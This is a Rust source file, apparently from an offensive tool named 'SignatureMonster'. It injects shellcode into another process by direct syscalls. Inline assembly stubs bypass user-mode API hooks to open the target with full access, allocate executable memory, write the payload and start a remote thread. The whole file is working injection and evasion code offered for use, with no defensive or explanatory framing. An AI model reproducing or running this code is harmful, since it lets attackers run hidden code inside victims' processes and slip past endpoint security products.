use std::mem;
use core::arch::global_asm;
use windows_sys::Win32::System::Threading::{PROCESS_ALL_ACCESS};
use windows_sys::Win32::System::WindowsProgramming::{CLIENT_ID};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS};

#[repr(C)]
pub struct OBJECT_ATTRIBUTES {
    pub Length: u32,
    pub RootDirectory: HANDLE,
    pub ObjectName: *mut std::ffi::c_void,
    pub Attributes: u32,
    pub SecurityDescriptor: *mut std::ffi::c_void,
    pub SecurityQualityOfService: *mut std::ffi::c_void,
}

use crate::syscall::get_syscall_number;

global_asm!(r#"
.global asm_nt_open_process
asm_nt_open_process:
    mov r10, rcx
    mov eax, [rsp + 0x28]
    syscall
    ret

.global asm_nt_allocate_virtual_memory
asm_nt_allocate_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x38]
    syscall
    ret

.global asm_nt_write_virtual_memory
asm_nt_write_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret

.global asm_nt_create_thread_ex
asm_nt_create_thread_ex:
    mov r10, rcx
    mov eax, [rsp + 0x60]
    syscall
    ret

.global asm_nt_close
asm_nt_close:
    mov r10, rcx
    mov eax, edx
    syscall
    ret
"#);

unsafe extern "C" {
    pub fn asm_nt_open_process(ProcessHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, ClientId: &mut CLIENT_ID, syscall_id: u32) -> NTSTATUS;
    pub fn asm_nt_allocate_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, ZeroBits: u32, RegionSize: &mut usize, AllocationType: u32, Protect: u32, syscall_id: u32) -> NTSTATUS;
    pub fn asm_nt_write_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *mut std::ffi::c_void, Buffer: *const std::ffi::c_void, NumberOfBytesToWrite: usize, NumberOfBytesWritten: &mut usize, syscall_id: u32) -> NTSTATUS;
    pub fn asm_nt_create_thread_ex(ThreadHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: *mut std::ffi::c_void, Argument: *mut std::ffi::c_void, CreateFlags: u32, ZeroBits: usize, StackSize: usize, MaximumStackSize: usize, AttributeList: *mut std::ffi::c_void, syscall_id: u32) -> NTSTATUS;
    pub fn asm_nt_close(Handle: HANDLE, syscall_id: u32) -> NTSTATUS;
}

/// Inject shellcode into a process using direct syscalls
pub fn inject_shellcode(pid: u32, shellcode: &[u8]) -> crate::Result<()> {
    unsafe {
        let mut process_handle: HANDLE = std::ptr::null_mut();
        let mut object_attributes: OBJECT_ATTRIBUTES = mem::zeroed();
        let mut client_id: CLIENT_ID = mem::zeroed();
        client_id.UniqueProcess = pid as _;

        let nt_open_process_syscall = get_syscall_number("NtOpenProcess")
            .ok_or_else(|| crate::SignatureMonsterError::Generic("Failed to get syscall number for NtOpenProcess".to_string()))?;

        let status = asm_nt_open_process(
            &mut process_handle,
            PROCESS_ALL_ACCESS,
            &mut object_attributes,
            &mut client_id,
            nt_open_process_syscall,
        );

        if status != 0 {
            return Err(crate::SignatureMonsterError::Generic(format!("NtOpenProcess failed with status: {:#x}", status)));
        }

        let mut alloc_addr: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut size = shellcode.len();
        let nt_allocate_virtual_memory_syscall = get_syscall_number("NtAllocateVirtualMemory")
            .ok_or_else(|| crate::SignatureMonsterError::Generic("Failed to get syscall number for NtAllocateVirtualMemory".to_string()))?;

        let status = asm_nt_allocate_virtual_memory(
            process_handle,
            &mut alloc_addr,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
            nt_allocate_virtual_memory_syscall,
        );

        if status != 0 {
            let _ = asm_nt_close(process_handle, get_syscall_number("NtClose").unwrap_or(0));
            return Err(crate::SignatureMonsterError::Generic(format!("NtAllocateVirtualMemory failed with status: {:#x}", status)));
        }

        let mut bytes_written = 0;
        let nt_write_virtual_memory_syscall = get_syscall_number("NtWriteVirtualMemory")
            .ok_or_else(|| crate::SignatureMonsterError::Generic("Failed to get syscall number for NtWriteVirtualMemory".to_string()))?;

        let status = asm_nt_write_virtual_memory(
            process_handle,
            alloc_addr,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut bytes_written,
            nt_write_virtual_memory_syscall,
        );

        if status != 0 {
            let _ = asm_nt_close(process_handle, get_syscall_number("NtClose").unwrap_or(0));
            return Err(crate::SignatureMonsterError::Generic(format!("NtWriteVirtualMemory failed with status: {:#x}", status)));
        }

        let mut thread_handle: HANDLE = std::ptr::null_mut();
        let nt_create_thread_ex_syscall = get_syscall_number("NtCreateThreadEx")
            .ok_or_else(|| crate::SignatureMonsterError::Generic("Failed to get syscall number for NtCreateThreadEx".to_string()))?;

        let status = asm_nt_create_thread_ex(
            &mut thread_handle,
            PROCESS_ALL_ACCESS,
            std::ptr::null_mut(),
            process_handle,
            alloc_addr,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
            nt_create_thread_ex_syscall,
        );

        if status != 0 {
            let _ = asm_nt_close(process_handle, get_syscall_number("NtClose").unwrap_or(0));
            return Err(crate::SignatureMonsterError::Generic(format!("NtCreateThreadEx failed with status: {:#x}", status)));
        }

        let nt_close_syscall = get_syscall_number("NtClose").unwrap_or(0);
        asm_nt_close(thread_handle, nt_close_syscall);
        asm_nt_close(process_handle, nt_close_syscall);

        Ok(())
    }
}
